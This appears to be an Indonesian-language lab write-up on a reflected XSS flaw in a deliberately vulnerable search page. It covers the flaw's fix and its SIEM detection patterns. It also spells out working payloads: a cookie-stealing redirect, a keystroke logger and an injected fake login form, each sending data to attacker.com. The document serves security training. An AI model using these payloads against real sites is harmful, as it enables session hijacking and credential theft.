# XSS Reflected — Cross-Site Scripting (Reflected)

## Deskripsi
XSS Reflected terjadi ketika input dari user langsung di-echo kembali ke halaman tanpa encoding. Payload tidak tersimpan di database — attacker harus membuat korban mengklik URL berbahaya.

**Severity:** Medium  
**OWASP:** A03:2021 — Injection

## Endpoint Vulnerable
- `GET /public/search.php?q=<PAYLOAD>`
- Parameter `q` di-echo langsung ke HTML tanpa `htmlspecialchars()`

## Langkah Eksploitasi

### Basic Reflected XSS
```
http://localhost:8080/public/search.php?q=<script>alert('XSS')</script>
```
→ Alert box muncul

### Cookie Stealing
```
http://localhost:8080/public/search.php?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

### Keylogger via XSS
```javascript
// Payload di-URL encode
<script>
document.addEventListener('keyup', function(e){
  fetch('http://attacker.com/log?k='+e.key);
});
</script>
```

### Phishing Form Injection
```javascript
<script>
document.querySelector('main').innerHTML='<div style="padding:2rem"><h2>Session expired. Please login again.</h2><form method="POST" action="http://attacker.com/steal"><input name="u" placeholder="Username"><input name="p" type="password" placeholder="Password"><button>Login</button></form></div>';
</script>
```

## Perbedaan vs Stored XSS
| | Reflected | Stored |
|--|--|--|
| Payload disimpan | ❌ | ✅ (di database) |
| Butuh URL trick | ✅ | ❌ |
| Endpoint | `/search.php?q=` | `/product.php` review |
| Jangkauan | Hanya korban yang klik link | Semua yang buka halaman |

## Expected Output
- Alert box muncul saat URL dibuka
- Cookie session ter-kirim ke attacker server
- Halaman login palsu tampil menggantikan konten asli

## SIEM Alert
Rule: `XSS` (sudah ada di Phase 1)  
Pattern: `<script`, `onerror=`, `javascript:` di parameter GET

## Cara Fix (Secure Mode)
```php
// Gunakan htmlspecialchars() SELALU saat output ke HTML
$q = htmlspecialchars($_GET['q'] ?? '', ENT_QUOTES, 'UTF-8');
echo "Hasil untuk: <strong>$q</strong>";

// Tambahkan Content-Security-Policy header
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

## Attack Chain
- **XSS Reflected + CSRF**: Kirim link XSS ke korban → XSS trigger CSRF form submit
- **XSS + Session Hijack**: Curi session cookie → login sebagai korban
